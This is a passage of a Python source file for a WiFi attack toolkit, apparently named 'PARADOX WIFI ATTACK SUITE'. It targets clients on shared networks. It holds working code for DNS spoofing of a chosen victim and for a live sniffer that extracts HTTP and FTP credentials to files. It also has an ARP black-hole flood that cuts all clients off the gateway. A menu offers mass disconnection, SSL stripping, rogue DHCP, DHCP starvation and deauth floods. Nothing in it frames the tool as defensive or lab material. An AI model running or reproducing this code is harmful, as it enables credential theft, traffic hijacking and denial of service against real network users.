            sendp([r_victim, r_gw] * 4, iface=net.iface, verbose=False)
            console.print(f"[green][*] ARP restored.[/green]")
        except Exception: pass
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f: f.write("0\n")
        except Exception: pass

# ─── DNS Spoof (while MITM active) ───────────────────────────────────────────

def dns_spoof_client(victim_ip: str, spoof_ip: str, keyword: str, iface: str) -> None:
    """
    Intercept DNS from a specific victim and spoof matching queries.
    Run after ARP MITM is active on the victim.
    """
    console.print(f"[bold red][*] DNS spoof for {victim_ip} → {spoof_ip}  filter='{keyword or 'ALL'}'[/bold red]")
    try:
        from scapy.all import sniff, DNS, DNSQR, DNSRR, IP, UDP, send
    except ImportError:
        console.print("[red]pip install scapy[/red]"); return

    counter = [0]

    def _proc(pkt):
        if not (pkt.haslayer(IP) and pkt.haslayer(DNS)): return
        if pkt[IP].src != victim_ip: return
        if pkt[DNS].qr != 0: return  # only queries
        qname = pkt[DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".")
        if keyword and keyword not in qname: return
        spoof = (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                 UDP(dport=pkt[UDP].sport, sport=53) /
                 DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                     an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=spoof_ip)))
        send(spoof, verbose=False)
        counter[0] += 1
        console.print(f"[cyan]   [{counter[0]}] {qname} → {spoof_ip}[/cyan]")

    console.print("[dim]   Ctrl-C to stop[/dim]")
    try:
        sniff(filter=f"udp port 53 and host {victim_ip}",
              prn=_proc, iface=iface, store=False)
    except KeyboardInterrupt:
        console.print(f"[green][*] DNS spoof stopped. {counter[0]} queries poisoned.[/green]")

# ─── Packet Sniffer (live credential extraction) ──────────────────────────────

def sniff_client_traffic(victim_ip: str, iface: str, duration: int = 60) -> None:
    """
    Live credential sniffer for a specific client (post-MITM).
    Extracts: HTTP Basic auth, POST body passwords, FTP USER/PASS, Telnet keystrokes.
    Saves full pcap.
    """
    import base64
    console.print(f"[bold red][*] Sniffing {victim_ip} for {duration}s...[/bold red]")
    try:
        from scapy.all import sniff, IP, TCP, Raw, wrpcap
    except ImportError:
        console.print("[red]pip install scapy[/red]"); return

    creds  = []
    frames = []

    def _proc(pkt):
        frames.append(pkt)
        if not (pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer(Raw)): return
        if pkt[IP].src != victim_ip and pkt[IP].dst != victim_ip: return
        payload = pkt[Raw].load.decode("utf-8", errors="ignore")
        dport   = pkt[TCP].dport

        m = re.search(r"Authorization: Basic (\S+)", payload, re.IGNORECASE)
        if m:
            try:
                dec  = base64.b64decode(m.group(1)).decode("utf-8", errors="ignore")
                line = f"[HTTP-BASIC] {victim_ip}: {dec}"
                creds.append(line)
                console.print(f"[bold green]   {line}[/bold green]")
            except Exception: pass

        if "POST " in payload and "\r\n\r\n" in payload:
            body = payload.split("\r\n\r\n", 1)[1]
            if any(k in body.lower() for k in ("password=", "passwd=", "pass=", "pwd=")):
                line = f"[HTTP-POST] {victim_ip}→{dport}: {body[:200]}"
                creds.append(line)
                console.print(f"[bold green]   {line}[/bold green]")

        if dport == 21 or pkt[TCP].sport == 21:
            for kw in ("USER ", "PASS "):
                if payload.upper().startswith(kw):
                    line = f"[FTP] {victim_ip}: {payload.strip()}"
                    creds.append(line); console.print(f"[bold green]   {line}[/bold green]")

    sniff(filter=f"host {victim_ip}", prn=_proc, iface=iface,
          timeout=duration, store=False)

    pcap_path = f"/tmp/sniff_{victim_ip.replace('.', '_')}.pcap"
    if frames:
        wrpcap(pcap_path, frames)
        console.print(f"[bold green][*] {len(frames)} packets → {pcap_path}[/bold green]")
    if creds:
        cred_path = pcap_path.replace(".pcap", "_creds.txt")
        Path(cred_path).write_text("\n".join(creds))
        console.print(f"[bold green]   {len(creds)} credentials → {cred_path}[/bold green]")

# ─── Termux Setup Check ───────────────────────────────────────────────────────

def termux_setup_check() -> None:
    console.print("[bold yellow][*] Checking environment...[/bold yellow]")
    checks = [
        ("python3",    ["python3", "--version"]),
        ("scapy",      ["python3", "-c", "import scapy"]),
        ("iw",         ["iw", "--version"]),
        ("ip",         ["ip", "-V"]),
        ("arp",        ["arp", "--version"]),
        ("aireplay-ng",["aireplay-ng", "--help"]),
        ("tcpdump",    ["tcpdump", "--version"]),
    ]
    for name, cmd in checks:
        try:
            subprocess.run(cmd, capture_output=True, timeout=3)
            console.print(f"[green]   ✓ {name}[/green]")
        except FileNotFoundError:
            console.print(f"[red]   ✗ {name} — not found[/red]")
        except Exception:
            console.print(f"[yellow]   ~ {name} — available[/yellow]")

    is_root = os.geteuid() == 0
    console.print(f"{'[green]   ✓ root' if is_root else '[red]   ✗ NOT root — raw sockets will fail'}[/{'green]' if is_root else 'red]'}")

    if not is_root:
        console.print("\n[bold red]Run as root:[/bold red]")
        console.print("[dim]   sudo python3 paradox_wifi.py[/dim]")
        console.print("[dim]   # On Termux with rooted Android: su -c 'python3 paradox_wifi.py'[/dim]")

    console.print("\n[bold yellow]Missing packages? Run:[/bold yellow]")
    console.print("[dim]   pkg update && pkg install python python-pip tcpdump net-tools aircrack-ng iproute2[/dim]")
    console.print("[dim]   pip install rich scapy requests[/dim]")
    console.print("[dim]   # For deauth without monitor mode: ARP black hole method is built-in.[/dim]")
    console.print("[dim]   # For 802.11 deauth (best method): external USB WiFi adapter via OTG → wlan1[/dim]")

# ─── WiFi Attack Menu ─────────────────────────────────────────────────────────

WIFI_MENU = """
[bold red]╔══════════════════════════════════════════════════════════╗
║          PARADOX WIFI ATTACK SUITE v1.0                    ║
╚══════════════════════════════════════════════════════════╝[/bold red]

[bold yellow]DISCOVERY[/bold yellow]
  1  Scan network — find all clients on the WiFi
  2  Deep scan a specific client (open ports + banners)
  3  Show current network info (SSID, BSSID, gateway, our IP)

[bold yellow]KICK / DISCONNECT[/bold yellow]
  4  🔥 MASS KICK — disconnect EVERYONE except you
  5  Kick a single client (ARP black hole)
  6  Set up monitor mode (for deauth method)

[bold yellow]MITM / INTERCEPT[/bold yellow]
  7  ARP MITM — get in between client and gateway
  8  DNS Spoof — redirect a client's DNS while MITM active
  9  Live sniffer — capture credentials from a client
  10 SSL Strip Proxy — downgrade HTTPS + log creds

[bold yellow]ATTACKS ON CLIENTS[/bold yellow]
  11 ARP Poison — flood a client's cache
  12 Port scan + exploit check on a client

[bold yellow]ATTACKS ON THE AP (router/public wifi)[/bold yellow]
  13 DHCP Starvation — exhaust the IP pool
  14 Rogue DHCP — become the DHCP server (you control GW+DNS)
  15 Deauth flood the AP (needs monitor mode)
  16 ARP Black Hole the gateway (cut entire network)

[bold yellow]TOOLS[/bold yellow]
  17 Termux setup check
  18 Monitor mode setup

  0  Exit
"""

def wifi_attack_menu() -> None:
    # ── Init ─────────────────────────────────────────────────────────────
    console.print(BANNER)

    iface = get_wifi_iface()
    iface = Prompt.ask("WiFi interface", default=iface)

    console.print(f"[yellow][*] Reading network info for {iface}...[/yellow]")
    net = get_network_info(iface)
    print_network_info(net)

    if not net.our_ip or not net.gateway_ip:
        console.print("[bold red][!] Not connected to a WiFi network, or IP not assigned.[/bold red]")
        console.print("[dim]   Connect to a WiFi first, then run this tool.[/dim]")

    clients: list[WifiClient] = []

    while True:
        console.print(WIFI_MENU)
        choice = Prompt.ask("[bold cyan]wifi>[/bold cyan]", default="0")

        # ── Discovery ─────────────────────────────────────────────────────

        if choice == "1":
            clients = discover_clients(net)
            print_clients(clients, net)

        elif choice == "2":
            c = select_client(clients)
            if c: quick_scan_client(c); print_clients([c], net)

        elif choice == "3":
            # Refresh network info
            net = get_network_info(iface)
            print_network_info(net)

        # ── Kick ──────────────────────────────────────────────────────────

        elif choice == "4":
            if not clients:
                console.print("[yellow]Run discovery (option 1) first to find clients.[/yellow]")
                do_disc = Prompt.ask("Run discovery now? (y/n)", default="y")
                if do_disc.lower().startswith("y"):
                    clients = discover_clients(net)
                    print_clients(clients, net)
            if clients:
                method = Prompt.ask("Method (auto/arp/deauth/aireplay)", default="auto")
                mass_kick_except_me(net, clients, method)

        elif choice == "5":
            c = select_client(clients)
            if c:
                dur = int(Prompt.ask("Duration sec (0=until Ctrl-C)", default="0"))
                arp_blackhole(c.ip, net.gateway_ip, iface, dur)

        elif choice == "6":
            mon = setup_monitor_mode(iface)
            if mon: console.print(f"[bold green]   Monitor iface ready: {mon}[/bold green]")

        # ── MITM ──────────────────────────────────────────────────────────

        elif choice == "7":
            c = select_client(clients)
            if c: arp_mitm_client(c, net)

        elif choice == "8":
            c = select_client(clients)
            if c:
                spoof_ip = Prompt.ask("Spoof all queries to IP", default=net.our_ip)
                keyword  = Prompt.ask("Domain keyword filter (empty=ALL)", default="")
                dns_spoof_client(c.ip, spoof_ip, keyword, iface)

        elif choice == "9":
            c = select_client(clients)
            if c:
                dur = int(Prompt.ask("Duration sec", default="60"))
                sniff_client_traffic(c.ip, iface, dur)

        elif choice == "10":
            lport = int(Prompt.ask("Local proxy port", default="10000"))
            console.print("[dim]   Set up iptables redirect first:[/dim]")
            console.print(f"[dim]   iptables -t nat -A PREROUTING -i {iface} -p tcp --dport 80 -j REDIRECT --to-port {lport}[/dim]")
            console.print(f"[dim]   iptables -t nat -A PREROUTING -i {iface} -p tcp --dport 443 -j REDIRECT --to-port {lport}[/dim]")
            # Import and run from main paradox module
            try:
                from paradox_netscan_v2_0_0 import ssl_strip_proxy
                ssl_strip_proxy(iface, lport)
            except ImportError:
                console.print("[yellow]   Run this alongside paradox_netscan_v2_0_0.py for SSL strip.[/yellow]")

        # ── Client Attacks ────────────────────────────────────────────────

        elif choice == "11":
            c = select_client(clients)
            if c: arp_blackhole(c.ip, net.gateway_ip, iface)

        elif choice == "12":
            c = select_client(clients)
            if c:
                quick_scan_client(c)
                print_clients([c], net)
                # Try exploits if interesting ports
                if 6379 in c.open_ports:
                    console.print("[bold red]   Redis open! Run paradox v2 → option 5 for RCE[/bold red]")
                if 2375 in c.open_ports:
                    console.print("[bold red]   Docker API open! Run paradox v2 → option 6 for RCE[/bold red]")
                if 21 in c.open_ports:
                    console.print("[bold yellow]   FTP open! Run paradox v2 → option 7 for brute[/bold yellow]")
                if 23 in c.open_ports:
                    console.print("[bold yellow]   Telnet open! Run paradox v2 → option 8 for auto-auth[/bold yellow]")

        # ── AP Attacks ────────────────────────────────────────────────────

        elif choice == "13":
            count = int(Prompt.ask("DISCOVER packets", default="500"))
            try:
                from paradox_netscan_v2_0_0 import dhcp_starvation
                dhcp_starvation(iface, count)
            except ImportError:
                console.print("[dim]   Import paradox_netscan_v2_0_0.py for DHCP starvation.[/dim]")

        elif choice == "14":
            try:
                from paradox_netscan_v2_0_0 import rogue_dhcp_server
                rogue_dhcp_server(iface, net.our_ip)
            except ImportError:
                console.print("[dim]   Import paradox_netscan_v2_0_0.py for rogue DHCP.[/dim]")

        elif choice == "15":
            if not net.bssid or net.bssid == "unknown":
                net.bssid = Prompt.ask("AP BSSID (not auto-detected)")
            console.print("[dim]   This requires monitor mode.[/dim]")
            mon = setup_monitor_mode(iface)
            if mon:
                try:
                    from paradox_netscan_v2_0_0 import wifi_deauth
                    wifi_deauth(mon, net.bssid, count=256)
                except ImportError:
                    console.print("[dim]   Import paradox_netscan_v2_0_0.py for deauth.[/dim]")

        elif choice == "16":
            console.print(f"[bold red][*] ARP Black Hole → Gateway {net.gateway_ip}[/bold red]")
            console.print("[bold red]   WARNING: This cuts internet for EVERYONE including you.[/bold red]")
            confirm = Prompt.ask("Confirm? (yes/no)", default="no")
            if confirm == "yes":
                # Black hole the gateway's IP from the network's perspective
                # Poison all clients to send gateway traffic to dead MAC
                if not clients:
                    clients = discover_clients(net)
                # Create fake gateway client object for each real client
                console.print("[dim]   Poisoning all clients' gateway ARP entry...[/dim]")
                try:
                    from scapy.all import ARP, Ether, sendp
                    DEAD_MAC = "de:ad:00:00:be:ef"
                    killed   = threading.Event()
                    pkts     = []
                    for c in clients:
                        if c.mac == "unknown": continue
                        pkts.append(
                            Ether(dst=c.mac, src=DEAD_MAC) /
                            ARP(op=2, pdst=c.ip, hwdst=c.mac,
                                psrc=net.gateway_ip, hwsrc=DEAD_MAC)
                        )
                    if pkts:
                        def _flood():
                            while not killed.is_set():
                                sendp(pkts, iface=iface, verbose=False)
                                time.sleep(1)
                        t = threading.Thread(target=_flood, daemon=True); t.start()
                        console.print("[bold green]   Network cut. Ctrl-C to stop.[/bold green]")
                        try:
                            while True: time.sleep(0.5)
                        except KeyboardInterrupt:
                            killed.set()
                except ImportError:
                    console.print("[red]pip install scapy[/red]")

        # ── Tools ─────────────────────────────────────────────────────────

        elif choice == "17":
            termux_setup_check()

        elif choice == "18":
            mon_iface = Prompt.ask("Interface to put in monitor mode", default=iface)
            setup_monitor_mode(mon_iface)

        elif choice == "0":
            console.print("[bold red]paradox wifi shut down.[/bold red]")
            break
        else:
            console.print("[dim]unknown option[/dim]")

# ─── Entry Point ──────────────────────────────────────────────────────────────

def main() -> None:
    if os.geteuid() != 0:
        console.print("[bold red][!] Root required.[/bold red]")
        console.print("[dim]   sudo python3 paradox_wifi.py[/dim]")
        console.print("[dim]   # Termux rooted: su -c 'python3 paradox_wifi.py'[/dim]")
        sys.exit(1)
    wifi_attack_menu()

if __name__ == "__main__":
    main()
